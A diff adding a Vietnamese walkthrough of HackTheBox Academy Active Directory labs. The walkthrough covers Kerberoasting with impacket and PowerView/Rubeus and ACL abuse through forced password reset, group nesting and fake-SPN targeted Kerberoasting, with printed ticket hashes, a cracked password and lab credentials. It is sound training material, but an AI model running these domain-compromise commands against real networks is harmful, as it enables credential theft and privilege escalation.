@@ -526,3 +526,588 @@ Global Group memberships     *File Share G Drive   *File Share H Drive
                              *VPN Users            *Shared Calendar Read
 The command completed successfully.
 ```
+
+
+# Kerberoasting - from Linux
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.171.95 (ACADEMY-EA-ATTACK01)   
+
+ SSH to 10.129.171.95 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 0  Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.
+
+Đầu tên, list SPN users với credential có sẵn là `htb-student:Academy_student_AD!` (tài khoản trong miền mà chúng ta đã được cấp để rdp) hoặc tài khoản mà người hướng dẫn dùng trong module: `forend:Klmcargo2`
+
+```zsh
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+Hoặc
+
+```zsh
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
+-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
+MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
+MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
+backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310             
+sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
+MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
+adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
+testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
+testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
+http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
+vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
+SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>                                
+```
+
+Lấy vé của người dùng `SAPService`:
+
+```zsh
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -request-user SAPService  -outputfile /tmp/SAPService_tgs                                                       
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
+------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
+SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>  
+```
+
+Đưa về Kali để bẻ khóa:
+
+```zsh
+cd /tmp
+python3 -m http.server 9981
+```
+
+Trên máy Kali:
+
+|EType|Hashcat Mode|Hash Format|
+|---|---|---|
+|RC4-HMAC (etype 23)|`13100`|`$krb5tgs$23$...`|
+|AES128-CTS-HMAC-SHA1-96|`19700`|`$krb5tgs$17$...`|
+|AES256-CTS-HMAC-SHA1-96|`19600`|`$krb5tgs$18$...`|
+
+```zsh
+wget http://10.129.171.95:9981/SAPService_tgs
+cat SAPService_tgs
+```
+![](images/9.png)
+
+Để ý rằng loại hash này có \$23\$ do đó ta dùng etype 23
+
+```zsh
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$ae445370f2167e57901931e4e7bcd79c$2a96eb7f8b9f7683d49ed82a20c935f031e04c6a40d3ac06f403fbc51055b1793a3e764f992edb2e229796da8e7f32433cd3f494a4001c0124f79829ebaf9b2df66cdd8e7266f08880f86505dc0be5b2b0bd3e775cf7aba4f2de5e1c7b6366859ae9f286ecf2895bcbffa181d0473a40f10de9c4cd5141d61114319d071b0bc977c98d103f9552f1dfde7c236363ca68e40fec36096cd739b7728293fbe53180b462468a9c6e4095982d8d4eda7d90318768708291d2849708310b4122cfae8917004244acda2770ac4807674a20fa7574700f73cfe50174602a2d0e40e605a0197c348aafbd26fcede685e6956d954e0ee530816df2655ba630582797381f5b94490d6875791995928bf2fd44a939685ceb11f5e1590c30b97677dbca907e02fe0c013f0a248286fcb8ca0cfca458d130cd882bfc08c2ec4c0ac92944febb27028c73fd45941cb51bfe4dbef51f875329130fc98465f76f7363229f52f6d824e54562102ad8872ada04a4d044629f80f2602e4012fd7950e7fa09238cb8445fdc11ac501d62a70acf3b244072a2a593e8cc04be276859863e0b8d33f06b9d9faac6bc2848587cde9655db9afa7b0cac17c6ed468fca93393d82ccbe71cc7c27da153e7e125226085b876b0bd30fd83ec60cce469a16f3965fd1d5002d4770ed1e9f1b47f9136dca281d6d624d363f24055044280cb95451a702423afdbacc73bf696edd9ba9c4c4d90baf9e07c5fc9e88239b53d37466e9ecbf856aec104d3a538a5ab81c1d920949863ab808992c254f8901b91a9d825cef89148f1bc2f6c8d15b8ff0d833b4a0f20d07a4869005940b179aa31da77a4b1f5f84298b330ff9cd0edb63cdcc3ba4ff616bf2525485a9a1de836039c4f9563435089d0fa07fada6c6d29e3fe8aef78fd1a14370497784aa690dc2c5f88112676ef30807e4923c639a0eb2774caf4731466b733a3fa3c9000e2370f5ab0773ebaa05ab39162da50efe565e65dcd53d2679b7701bd078d3614cf8008708811cbe9f9c5d190a1b20c9913e2458424c1dc212daf8a7abde2eb72ff6bb49a54cf3c02cee67d83efe0b76a9960e50761111ed27c13fe5ba6bf40119b11dd64d7ced2aa3597a14c80dc6e31e8eb841e175ae572b01b7d4ff2bdda108c0af07f2227a72ee55a123c69131e5a3e4dcab08fcb6a1b7ab1f02f1dd9ed1c4d316cc2758beb566996b1b9c90454aa8acf55f0a8a936bc29c6d2eae6c90d0766ba63164d3201f7f39b1a060107c2bbc4189b9a301fd040e1b0a051caf952ca07b92095b41a038ac635c79c177a9f0adc7a4bd78e6646e621155e962a1c40775c97ea0816d746bc71897145534c73a648513923d49ab7eb007c0c2bea5a68e120b3e21a4db0fe0c271b3f98cb22c6c1349860dbbcc41285526ec0aa102551a65efcf3c67f9509cb9f1a7c0ae7b23e4021fa16ca249f804d4e1c6940c325415165e1f96d31c0500bce405632be2faf0051dcd6b3c3b1f6ab5affb302a78:!SapperFi2
+```
++ 0  What powerful local group on the Domain Controller is the SAPService user a member of?
+
+Chúng ta hoàn toàn có thể sử dụng BloodHound để kiểm tra, tuy nhiên kết quả đã quá rõ ràng khi thực hiện liệt kê các tài khoản SPN:
+
+```zsh
+SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL    
+```
+
+Người dùng này thuộc một nhóm có quyền lực tiềm năng cho leo thang trong miền: 
+`CN=Account Operators`
+
+# Kerberoasting - from Windows
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.68.100 (ACADEMY-EA-MS01)   
+
+ RDP to 10.129.68.100 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  What is the name of the service account with the SPN 'vmware/inlanefreight.local'?
+
+```powershell
+PS C:\Tools> Get-DomainUser * -spn | select samaccountname,DistinguishedName,ServicePrincipalName
+
+samaccountname    distinguishedname                                                                         serviceprincipalname
+--------------    -----------------                                                                         --------------------
+adfs              CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                             adfsconnect/azure01.inlanefreig...
+backupagent       CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                      backupjob/veam001.inlanefreight...
+certsvc           CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                             http://ACADEMY-EA-CA01.INLANEFR...
+krbtgt            CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                              kadmin/changepw
+damundsen         CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL {MSSQLSvc/ACADEMY-EA-DB01.INLAN...
+sqldev            CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           MSSQLSvc/DEV-PRE-SQL.inlanefrei...
+sqlprod           CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                          MSSQLSvc/SPSJDB.inlanefreight.l...
+sqlqa             CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                            MSSQLSvc/SQL-CL01-01inlanefreig...
+SAPService        CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                          SAPService/srv01.inlanefreight....
+solarwindsmonitor CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                sts/inlanefreight.local
+testspn           CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                             testspn/kerberoast.inlanefreigh...
+testspn2          CN=testspn2,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                            testspn2/kerberoast.inlanefreig...
+svc_vmwaresso     CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       vmware/inlanefreight.local
+```
+
++ 0  Crack the password for this account and submit it as your answer.
+
+Chúng ta đã xác định được đối tượng cần khai thác đó là `svc_vmwaresso`
+
+Giờ tiến hành trích xuất vé của người dùng này:
+
+```powershell
+PS C:\Tools> Get-DomainUser svc_vmwaresso -SPN | Get-DomainSPNTicket -Format Hashcat
+
+
+SamAccountName       : svc_vmwaresso
+DistinguishedName    : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : vmware/inlanefreight.local
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$0DDC026F40578430E791C61375F862C7$0286C9FE3A2521E8C47B27F5BD3146FF3FCC4DFD6E4183221E33DB83339FA1CA6AA29CD044D4618E20DE29F382AA0F811C3E3FE0952917E40D031F7724C644AEDC82A4FF4ABA5CABA6102C99D96D632F1253EEEE49767D0CE4B9E84A52B78DC66F529C060471322C7BC7DA3EF6CBF092C3E26EE793CD07D04968BCB54BE873B0F6B67F8597965F334334F963159DFFF5C5FFDBEE1BF336566FA429229FE0914E0EAC0D077E60E7F7EB556428D6244F31126E75929CF0DF970EDFED145957DBAD2BB68AE55848F38082EF05EAB9BAFA73F9C9CC7572F1C3C4B2F7989639804774BAE17915F7ABEA844C9AB1FFE5AAC70A68CEE1CD31016CD1A00F088938CC8B38524A35A9AFBA7E396D0BB7D7CBB3DC6B0F86C93C342224D1D6B1FE9ABC796A815A53EAA915BF8296F4BF0B6293C4DCA9836477FDE8DA8C61E23B1B7446B19925C14907F513EF4743A28ADD1393D2DFAAE1392390817C829938C844B07F0305F30F17D04BC388CD8B1F03C84EDA90CAAF27F6D661E98C26849FC01202322141C6642279D3CFFE2744FB8DF7BAECB75E0B5CF2E063644F55FCF2C9A3A016B2C29D169F3C52F7FC6EFE03058F6118EBCD22455E226C4DB399D3CA26F582EF3E655447ED0F8C7B14A3AB5B001AA34C1485ED91C705F3C5F9546D3E570B22CE6AD961ED0FF66FD859E80FD0D87183971B23830F4EDB3D8DD6EF912ED94C7C068C7B0C9590AF37F2912828F138D6ED083801B7FE85BFFD52FDA343E597656F06D078AB6E1386C6EFF62C56DA194980DED60A7C7CA1852C7800753C3729CAF4F56FF5C0B83C949E019873F7B77F86026E5E1D7AD9168C6EDB3717CB256A49E1D45B65C4E53CDD13F80639EF39AB899462405317D30EC4887D3F032B390EAB4C2CD77146328CAD860A6AA2F29337090AE30DB640BE1BFE91C2CE87F67A35FE19B6C6716BA84729D91B8934113FF6BB5F04BF524A0920771698CB595666CD385D959DC0426E4464346C9B8BE86F5A8610AA39ECDEFBBAB23B4ADEA331382CAEE9259D763637512938446F26CD480183C38DB5A75B75117837C184BEDCFE69D92276BBAADE4837B97FF68C317541D42B330383E9ADB023E1874201B04DCA41A8BAEB47C81D18AF935A8D895C126770BF3D1023A3104E978D1C1A3EC95C6AC3DE09253F0B34F0A1C2E20E18247FEE642C20CA26B961904953A0E8D0029EA1C8A86BC4D978F341D7A79EF95DAE9EAF26DD46131E03D1D2B7D1C634B74FB93C667905F3AD70FEF8646870766AC769516FADA0CFBFD147476FE8C8C74A8AE983837DAEF72DC83215D62ACE0AF376EFE35CFFBCF1576B46596DC83420834E9E316E5A65CBAE2B9A6D2C33A4B37B512184040EC6A532D74BF747372F95CEE7687021DF39A19EEF30EB501E4C7B1DF2D51BD53CA418736B131259AB69FCD55B57EC79594CAF6D7FBA6B348CE301FDDD2D5B1653C090082CDABC5F8F7484D3F20F5C33A9415358CF416E1BE43CDAF7960C07B51885B2585BD0970DE3A4E5A30BBB73F3860D9657ACE1C9C5C8661F7A247B77F12D668741DBE13480B5160DFFF43A4D6872DC737CE70D7BB54148497DB049D2C5EBF58AA3CE5B50105B98AD92CFF93ADCADBD5D9F1DCC3A3BC8AB31D1918CC0A0B9DA81DFE41B8617AEDF353591205F
+
+```
+
+
+# Access Control List (ACL) Abuse Primer
+
+#### Questions
+
++ 0  What type of ACL defines which security principals are granted or denied access to an object? (one word)
+
+DACL
+
++ 0  Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?
+
+GenericAll
+
+
+# ACL Enumeration
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.255.194 (ACADEMY-EA-MS01)   
+
+ RDP to 10.129.255.194 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  What is the rights GUID for User-Force-Change-Password?
+
+00299570-246d-11d0-a768-00aa006e0529
+
++ 0  What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?
+
+ResolveGUIDs
+
++ 0  What privileges does the user damundsen have over the Help Desk Level 1 group?
+
+ListChildren, ReadProperty, GenericWrite
+
++ 0  Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $sid = Convert-NameToSid forend
+PS C:\Tools> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
++ 0  What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)
+
+```zsh
+PS C:\Tools> Get-DomainObjectACL -ResolveGUIDs -Identity 'GPO Management' | Where-Object { $_.SecurityIdentifier -eq $sid }
+
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : Self
+ObjectAceType          : Self-Membership
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
+AccessMask             : 8
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+AceType               : AccessAllowed
+ObjectDN              : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ReadProperty, WriteProperty, GenericExecute
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4046
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
+AccessMask            : 131124
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+
+# ACL Abuse Tactics
+
+#### Questions
+
+ RDP to  with user "htb-student" and password "Academy_student_AD!"
+
++ 0  Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.
+
+Như ở phần trước, chúng ta lụm được password của người dùng `wley` thông qua việc bắt hàm băm xác thực bằng `responder` sau đó crack... Với thông tin xác thực `wley:transporter@4` chúng ta sẽ tiến hành một tình huống ACLs Abusing.
+
+Như thường lệ, với thông tin xác thực của `wley`, chúng ta xem hắn ta có thể có những đặc quyền nào.
+
+Sử dụng **PowerView**
+
+```zsh
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\Tools> $sid=Convert-NameToSid wley
+PS C:\Tools> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 256
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AceType                : AccessAllowedObject
+AceFlags               : ContainerInherit
+IsInherited            : False
+InheritanceFlags       : ContainerInherit
+PropagationFlags       : None
+AuditFlags             : None
+```
+
+
+Chúng ta chú ý đến các thông tin này:
+
+```powershell
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+```
+
+Nếu search google thì nghĩa là: chúng ta có quyền thay đổi mật khẩu của `Dana Amundsen` mà không cần biết mật khẩu của hắn ta -[User-Force-Change-Password] [https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password]
+
+![](images/10.png)
+
+Giờ chúng ta cần xác định username hay samaccountname của `Dana Amundsen`:
+
+```powershell
+PS C:\Tools> Get-DomainUser -Identity "S-1-5-21-3842939050-3880317879-2865463114-1176" | Select-Object samaccountname, distinguishedname
+
+samaccountname distinguishedname
+-------------- -----------------
+damundsen      CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+Đây rồi, username của anh ta là `damundsen`, anh ta thuộc các nhóm như DevOps, IT, HQ-NYC, Employees, Corp.
+
+Trước hết chúng ta cứ thay đổi mật khẩu của `damundsen`, sau đó sẽ tìm kiếm thêm đặc quyền từ thông tin xác thực của anh ta:
+
+Tạo biến chứa thông tin xác thực nhanh cho wley:
+
+```powershell
+$WleyPassword = ConvertTo-SecureString ‘transporter@4’ -AsPlainText -Force
+
+$WleyCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $WleyPassword)
+```
+
+Import PowerView
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+Đặt password mới cho damundsen:
+
+```powershell
+$damundsenPassword = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $WleyCred -Verbose
+```
+
+![](images/11.png)
+
+Một thông tin xác thực mới vừa được khám phá: `damundsen:Welcome1!`
+
+Sau đó chúng ta tiếp tục recon xem người dùng damundsen có các đặc quyền nào.
+
+```powershell
+$sid2=Convert-NameToSid damundsen
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
+AccessMask            : 131132
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+Xác định rõ ràng rằng damundsen có quyền [GenericWrite][https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-9.0#fields] đối với `Help Desk Level 1`, vậy anh ta có thể làm gì? 
+1. **Thêm/Xóa thành viên trong nhóm**
+
+2. **Sửa đổi thuộc tính nhóm**
+
+- Thay đổi **scope** (Domain Local → Global) để mở rộng phạm vi ảnh hưởng.
+    
+- Sửa **SID**, mô tả, hoặc thông tin liên hệ để che giấu hành vi tấn công.
+
+3. **Tấn công nhóm lồng nhau (Nesting)**
+
+Trước hết, tôi sẽ thêm người dùng `damundsen` với vai trò là gián điệp vào trong nhóm `Help Desk Level 1` với đặc quyền GenericWrite thông qua `Add-DomainGroupMember`
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+PS C:\Tools> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+PS C:\Tools> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+
+Sau đó kiểm tra lại liệu `damundsen` đã là thành viên của `Help Desk Lv 1` chưa:
+
+```powershell
+
+PS C:\Tools> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+MemberName
+----------
+busucher
+spergazed
+whounces1950
+tatem1940
+whighwand1962
+freg1943
+sulliss
+theken1998
+vered1980
+plase1985
+trisheye
+susecum
+lifee1989
+whyall
+hinct1998
+lacce1947
+reaked
+cousitony
+anniguiturve
+pristor
+withem
+sureat
+nower1959
+hilowentoce
+hispossiond
+damundsen
+dpayne
+```
+
+Như vậy đã coi như là thành công.
+
+Giờ tôi muốn xem liệu "Help Desk Level 1" có gì đặc biệt?
+
+```powershell
+PS C:\Tools> Get-DomainGroup -Identity "Help Desk Level 1"
+
+
+usncreated            : 36950
+grouptype             : GLOBAL_SCOPE, SECURITY
+samaccounttype        : GROUP_OBJECT
+samaccountname        : Help Desk Level 1
+whenchanged           : 5/31/2025 10:37:17 AM
+objectsid             : S-1-5-21-3842939050-3880317879-2865463114-4022
+objectclass           : {top, group}
+cn                    : Help Desk Level 1
+usnchanged            : 3322008
+dscorepropagationdata : {3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 3/22/2022 3:03:17 AM, 3/22/2022 3:03:14 AM...}
+memberof              : CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+distinguishedname     : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+name                  : Help Desk Level 1
+member                : {CN=Stella
+                        Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Marie
+                        Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL,
+                        CN=Jerrell
+                        Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL,
+                        CN=Evelyn
+                        Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+whencreated           : 10/28/2021 1:09:07 AM
+instancetype          : 4
+objectguid            : e539dfde-c633-4a10-bb81-d7ee2d3deb8f
+objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+
+```
+
+Tôi nhận ra rằng mình hoàn toàn có thể lợi dụng nhóm lồng nhau (nested group) để biến nó thành vector leo thang của mình:
+```powershell
+memberof              : CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+Hãy xem nhóm này có gì?
+
+```powershell
+$itgroupsid = Convert-NameToSid "Information Technology"
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+Như vậy "Information Technology"  có quyền GenericAll đối với người dùng `Angela Dunn`  và anh ta thuộc Server Admin, chứng tỏ người dùng này rất tiềm năng trong việc leo thang. Người dùng damundsen nằm trong nhóm Help Desk Lv 1, nhóm này lồng với nhóm IT, do đó, damundsen hoàn toàn có quyền GenericAll đối với adunn.
+
+Hãy điều tra thêm về người dùng này:
+
+![](images/12.png)
+Dễ dàng biết được username của anh ta là `adunn`.
+
+Đối với GenericAll, chúng ta có thể làm những điều sau với `adunn`:
+- Reset mật khẩu
+- Sửa thuộc tính (kể cả servicePrincipalName)
+- Chiếm quyền sở hữu
+
+Trong hướng dẫn có đề cập rằng: Vector Kerberoasting trong kịch bản này
+Tại sao dùng Kerberoasting thay vì reset mật khẩu?
+◇ Reset mật khẩu adunn sẽ gây gián đoạn dịch vụ (vì adunn đang hoạt động)
+◇ Kerberoasting cho phép lấy hash mật khẩu mà không thay đổi trạng thái tài khoản → tấn công "im lặng"
+
+Mở cửa sổ powershell mới để cập nhật quyền mà chúng ta đã thêm vào nhóm:
+Trước hết, tạo thông tin xác thực cho damundsen:
+```powershell
+#### Creating a SecureString Object using damundsen
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+PS C:\Tools> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+```
+
+#### Creating a Fake SPN
+
+```powershell
+PS C:\Tools> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+
+Xong, giờ chạy Rubeus.exe để thu vé về thôi:
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+![](images/13.png)
+
